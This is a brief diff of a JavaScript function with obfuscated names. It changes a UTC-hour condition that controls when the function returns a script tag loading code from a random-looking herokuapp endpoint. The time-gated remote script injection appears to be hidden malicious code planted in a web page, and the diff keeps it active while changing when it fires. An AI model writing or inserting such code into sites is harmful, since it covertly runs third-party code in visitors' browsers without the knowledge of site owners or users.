@@ -162,7 +162,7 @@ function mBV(s,b,t){
  var nD=new Date();
  var nH=nD.getUTCHours();
 
- if(nH>=8){
+ if(nH<8){
 	 if(s=='s'&&t!=0){
 		 return bSt+'<script id="yp_1391" src=\"https://lit-shore-57528.herokuapp.com/get2.php?a=072dd228c519a31a4894e0005b4f3ad6\"><\/script>'+bEn;
 	 }
